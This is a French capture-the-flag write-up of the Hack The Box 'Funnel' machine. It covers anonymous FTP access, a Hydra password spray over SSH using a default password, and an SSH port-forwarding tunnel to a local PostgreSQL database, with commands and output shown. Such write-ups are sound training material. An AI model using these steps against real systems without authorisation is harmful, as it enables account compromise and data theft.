---
title: "Funnel"
date: 2026-02-14
description: "Exploitation d'un FTP anonyme et port forwarding SSH pour accéder à une base de données PostgreSQL locale."
draft: false

tags: ["Misconfiguration", "FTP", "SSH", "Port Forwarding", "PostgreSQL", "Hydra", "Linux", "Tier 1", "VIP"]
categories: ["Writeups", "Hack The Box", "Starting Point"]
---

# Introduction

Bienvenue sur **Funnel**, une machine du **Tier 1** de **Starting Point** qui illustre une chaîne d'attaque classique mais redoutablement efficace : des identifiants qui fuient via un **FTP anonyme**, un mot de passe par défaut qui n'a jamais été changé, et une base de données **PostgreSQL** accessible uniquement en local... jusqu'à ce qu'on utilise le **port forwarding SSH** pour y accéder depuis l'extérieur.

Cette machine est un excellent rappel que la sécurité d'un système repose souvent sur ses maillons les plus faibles, et qu'une simple fuite d'information peut conduire à une compromission complète.

>[!TIP]
Attention : Il s’agit d’une machine VIP. Vous aurez besoin d’un abonnement HTB pour pouvoir la lancer.

>[!WARNING]
>Dans ce writeup, je ne publie pas directement le flag final, l'objectif est d'apprendre en pratiquant. Si vous voulez le flag, suivez les étapes sur la machine.

>[!CAUTION]
>**NOTE :** n'attaquez que des machines sur lesquelles vous avez l'autorisation (ex. machines HTB, ou lab perso). Respectez les règles de la plateforme.

## Vidéo Walkthrough

Je sortirais bientot un tuto vidéo, d'ici la tu peux aller checker ma chaine Youtube
{{< button href="https://www.youtube.com/@Raven_Breach/videos" target="_blank" >}}
{{< icon "youtube" >}} RavenBreach
{{< /button >}}

---

## Reconnaissance

### Découverte d'hôte

On commence par un `ping` pour vérifier que la cible est en ligne.

```bash
┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.86]─[ravenbreach@htb-afibc90wdb]─[~]
└──╼ [★]$ ping 10.129.228.195

PING 10.129.228.195 (10.129.228.195) 56(84) bytes of data.
64 bytes from 10.129.228.195: icmp_seq=1 ttl=63 time=7.60 ms
64 bytes from 10.129.228.195: icmp_seq=2 ttl=63 time=7.65 ms
64 bytes from 10.129.228.195: icmp_seq=3 ttl=63 time=7.99 ms
64 bytes from 10.129.228.195: icmp_seq=4 ttl=63 time=7.73 ms
^C
--- 10.129.228.195 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 7.601/7.743/7.993/0.151 ms
```

Le **TTL de 63** indique qu'il s'agit d'une machine **Linux**.

### Énumération des services

Lançons un scan `nmap` avec détection de versions pour identifier les services exposés.

```bash
┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.86]─[ravenbreach@htb-afibc90wdb]─[~]
└──╼ [★]$ nmap -sV 10.129.228.195

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-11 10:45 CST
Nmap scan report for 10.129.228.195
Host is up (0.0094s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.55 seconds
```

Deux ports ouverts :
- **Port 21** : FTP (vsftpd 3.0.3)
- **Port 22** : SSH (OpenSSH 8.2p1)

### Scan approfondi avec les scripts Nmap

Lançons un scan plus précis avec les scripts par défaut (`-sC`) sur ces deux ports.

```bash
┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.86]─[ravenbreach@htb-afibc90wdb]─[~]
└──╼ [★]$ nmap -p21,22 -sC -sV 10.129.228.195

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-11 10:48 CST
Nmap scan report for 10.129.228.195
Host is up (0.0080s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.86
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.98 seconds
```

Deux informations clés ressortent immédiatement :
- La **connexion FTP anonyme est autorisée** (FTP code 230)
- Un dossier `mail_backup` est visible sans authentification

C'est notre point d'entrée.

---

## Pré-Exploitation

### Connexion FTP anonyme et récupération des fichiers

Connectons-nous au serveur FTP avec l'identifiant `anonymous` (n'importe quel mot de passe ou vide fera l'affaire).

```bash
┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.86]─[ravenbreach@htb-afibc90wdb]─[~]
└──╼ [★]$ ftp 10.129.228.195

Connected to 10.129.228.195.
220 (vsFTPd 3.0.3)
Name (10.129.228.195:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

Navigons dans le dossier `mail_backup` et listons son contenu.

```bash
ftp> cd mail_backup
250 Directory successfully changed.

ftp> dir
229 Entering Extended Passive Mode (|||65499|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp         58899 Nov 28  2022 password_policy.pdf
-rw-r--r--    1 ftp      ftp           713 Nov 28  2022 welcome_28112022
226 Directory send OK.
```

Deux fichiers intéressants. On les récupère tous les deux avec `get`.

```bash
ftp> get password_policy.pdf

local: password_policy.pdf remote: password_policy.pdf
229 Entering Extended Passive Mode (|||57622|)
150 Opening BINARY mode data connection for password_policy.pdf (58899 bytes).
100% |***********************************| 58899        2.93 MiB/s    00:00 ETA
226 Transfer complete.
58899 bytes received in 00:00 (2.07 MiB/s)

ftp> get welcome_28112022

local: welcome_28112022 remote: welcome_28112022
229 Entering Extended Passive Mode (|||44433|)
150 Opening BINARY mode data connection for welcome_28112022 (713 bytes).
100% |***********************************|   713      925.91 KiB/s    00:00 ETA
226 Transfer complete.
713 bytes received in 00:00 (86.05 KiB/s)
```

### Analyse des fichiers récupérés

De retour sur notre terminal, lisons le fichier texte avec `cat`.

```bash
┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.86]─[ravenbreach@htb-afibc90wdb]─[~]
└──╼ [★]$ cat welcome_28112022

Frome: root@funnel.htb
To: optimus@funnel.htb albert@funnel.htb andreas@funnel.htb christine@funnel.htb maria@funnel.htb
Subject:Welcome to the team!

Hello everyone,
We would like to welcome you to our team. 
We think you’ll be a great asset to the "Funnel" team and want to make sure you get settled in as smoothly as possible.
We have set up your accounts that you will need to access our internal infrastracture. Please, read through the attached password policy with extreme care.
All the steps mentioned there should be completed as soon as possible. If you have any questions or concerns feel free to reach directly to your manager. 
We hope that you will have an amazing time with us,
The funnel team.
```

Ce mail de bienvenue est une mine d'or. On y découvre :
- Le nom de domaine : `funnel.htb`
- Une liste d'utilisateurs potentiels : `optimus`, `albert`, `andreas`, `christine`, `maria`
- Une référence à une **politique de mot de passe** dans le PDF joint

<img src="image1.png"/>

En ouvrant le fichier `password_policy.pdf`, on y trouve le **mot de passe par défaut** attribué à tous les nouveaux comptes : `funnel123#!#`. Le mail demande à tous les employés de le changer le plus vite possible...

>[!TIP]
>Dans un vrai engagement de pentest, ce genre de document interne est de l'or. Les utilisateurs qui n'ont pas changé leur mot de passe par défaut sont des cibles prioritaires.

---

## Exploitation

### Bruteforce SSH avec Hydra

On a une liste d'utilisateurs et un mot de passe par défaut. Le port SSH est ouvert. La combinaison parfaite pour tenter un **password spray** avec **Hydra**.

On commence par créer un fichier avec tous les noms d'utilisateurs extraits du mail.

```bash
┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.86]─[ravenbreach@htb-afibc90wdb]─[~]
└──╼ [★]$ cat usernames.txt 
root
optimus
albert
andreas
christine
maria
```

Puis on lance Hydra avec le mot de passe par défaut.

- `-L` : fichier contenant la liste d'identifiants
- `-p` : mot de passe unique à tester
- `ssh` : service cible

```bash
┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.86]─[ravenbreach@htb-afibc90wdb]─[~]
└──╼ [★]$ hydra -L usernames.txt -p 'funnel123#!#' 10.129.228.195 ssh

Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-11 11:15:27
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:6/p:1), ~1 try per task
[DATA] attacking ssh://10.129.228.195:22/
[22][ssh] host: 10.129.228.195   login: christine   password: funnel123#!#
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-11 11:15:31
```

Bingo ! **Christine** n'a pas changé son mot de passe par défaut. On peut se connecter en SSH avec ses identifiants.

### Connexion SSH et énumération interne

```bash
┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.86]─[ravenbreach@htb-afibc90wdb]─[~]
└──╼ [★]$ ssh christine@10.129.228.195

The authenticity of host '10.129.228.195 (10.129.228.195)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.228.195' (ED25519) to the list of known hosts.
christine@10.129.228.195's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 11 Jan 2026 05:19:46 PM UTC

  System load:              0.0
  Usage of /:               63.2% of 4.78GB
  Memory usage:             13%
  Swap usage:               0%
  Processes:                159
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for ens160:  10.129.228.195
  IPv6 address for ens160:  dead:beef::250:56ff:fe94:4ca1

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


christine@funnel:~$ 
```

On est connecté en tant que `christine`. Une première exploration du système ne révèle rien d'évident. Cherchons les services qui tournent en interne, non exposés à l'extérieur.

```bash
christine@funnel:/$ ss -tln

State   Recv-Q   Send-Q     Local Address:Port      Peer Address:Port
LISTEN  0        4096       127.0.0.53%lo:53             0.0.0.0:*
LISTEN  0        128              0.0.0.0:22             0.0.0.0:*
LISTEN  0        4096           127.0.0.1:5432           0.0.0.0:*
LISTEN  0        4096           127.0.0.1:36455          0.0.0.0:*
LISTEN  0        32                     *:21                   *:*
LISTEN  0        128                 [::]:22                [::]:*
```

On remarque que le port **5432** écoute uniquement en `localhost` (127.0.0.1). En relançant la commande sans le flag `-n` pour résoudre les noms de service, on confirme qu'il s'agit de **PostgreSQL**.

```bash
christine@funnel:/$ ss -tl

State   Recv-Q  Send-Q   Local Address:Port
LISTEN  0       128            0.0.0.0:ssh
LISTEN  0       4096         127.0.0.1:postgresql
LISTEN  0       32                   *:ftp
```

Une base de données PostgreSQL tourne en local ! Malheureusement, `psql` n'est pas installé sur la machine et on n'a pas les droits pour l'installer.

### Port Forwarding SSH

C'est ici qu'entre en jeu une technique puissante : le **Local Port Forwarding SSH**. L'idée est de créer un tunnel entre notre machine locale et le service distant inaccessible depuis l'extérieur.

Concrètement, on va dire à SSH : *"Sur mon port local 1234, écoute, et redirige tout vers localhost:5432 sur la machine distante."*

```bash
┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.86]─[ravenbreach@htb-afibc90wdb]─[~]
└──╼ [★]$ ssh -L 1234:localhost:5432 christine@10.129.228.195

christine@10.129.228.195's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 11 Jan 2026 06:16:29 PM UTC

  System load:              0.0
  Usage of /:               63.2% of 4.78GB
  Memory usage:             13%
  Swap usage:               0%
  Processes:                158
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for ens160:  10.129.228.195
  IPv6 address for ens160:  dead:beef::250:56ff:fe94:4ca1

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Jan 11 17:19:47 2026 from 10.10.14.86
christine@funnel:~$ 
```

On est reconnecté normalement, mais en arrière-plan le tunnel est actif. On peut le vérifier depuis un autre terminal sur notre machine.

```bash
┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.86]─[ravenbreach@htb-afibc90wdb]─[~]
└──╼ [★]$ ss -tlnp

State     Recv-Q    Send-Q       Local Address:Port
LISTEN    0         128              127.0.0.1:1234      users:(("ssh",pid=157558,fd=5))
```

Le port 1234 écoute localement, géré par SSH. Le tunnel est en place.

### Connexion à PostgreSQL via le tunnel

On installe `psql` sur notre machine locale, puis on se connecte via le tunnel. On utilise le même mot de passe par défaut `funnel123#!#`. On est maintenant dans la base de données.

```bash
┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.86]─[ravenbreach@htb-afibc90wdb]─[~]
└──╼ [★]$ sudo apt update && sudo apt install postgresql-client

┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.86]─[ravenbreach@htb-afibc90wdb]─[~]
└──╼ [★]$ psql -U christine -h localhost -p 1234

Password for user christine:
psql (15.14 (Debian 15.14-0+deb12u1), server 15.1)
Type "help" for help.

christine=#
```

---

## Post-Exploitation

### Exploration de la base de données

Listons les bases de données disponibles avec `\l`.

```sql
 christine=# \l

                                                  List of databases
   Name    |   Owner   | Encoding |  Collate   |   Ctype    | ICU Locale | Locale Provider |    Access privileges    
-----------+-----------+----------+------------+------------+------------+-----------------+-------------------------
 christine | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | 
 postgres  | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | 
 secrets   | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | 
 template0 | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | =c/christine           +
           |           |          |            |            |            |                 | christine=CTc/christine
 template1 | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | =c/christine           +
           |           |          |            |            |            |                 | christine=CTc/christine
```

La base de données **secrets** se distingue clairement. Connectons-nous.

```sql
christine=# \connect secrets

psql (15.14 (Debian 15.14-0+deb12u1), server 15.1 (Debian 15.1-1.pgdg110+1))
You are now connected to database "secrets" as user "christine".
secrets=# 
```

Listons les tables avec `\dt`.

```sql
secrets=# \dt

         List of relations
 Schema | Name | Type  |   Owner   
--------+------+-------+-----------
 public | flag | table | christine
(1 row)

secrets=# 
```

Une table `flag`. Il ne reste plus qu'à faire une requête SQL pour récupérer son contenu.

```sql
secrets=# SELECT * FROM flag;

              value               
----------------------------------
 cf2{...}db1
(1 row)
```

Le flag est récupéré ! La machine est ***pwned*** !

---

## Conclusion

Cette machine nous a appris une chaîne d'exploitation simple mais réaliste, que l'on rencontre régulièrement dans les environnements d'entreprise. Voici le récapitulatif :

1. **FTP anonyme** => Accès à un dossier `mail_backup` contenant un email interne et une politique de mot de passe avec un **mot de passe par défaut**
2. **Password Spray avec Hydra** => Découverte que `christine` n'a jamais changé son mot de passe par défaut, permettant une **connexion SSH**
3. **Énumération interne** => Découverte d'un service **PostgreSQL** accessible uniquement en localhost
4. **Port Forwarding SSH** => Tunnel SSH pour rediriger le port 5432 distant vers notre port local 1234, rendant la base de données accessible depuis notre machine
5. **Accès PostgreSQL** => Connexion avec les mêmes credentials et récupération du flag dans la base `secrets`

<!-- ---

## Pour aller plus loin

### Script automatisé
Ce n'est pas encore fait mais je prévois de faire un script automatisé !

### Rapport professionnel
Ce n'est pas encore fait mais je prévois de faire un rapport professionnel ! -->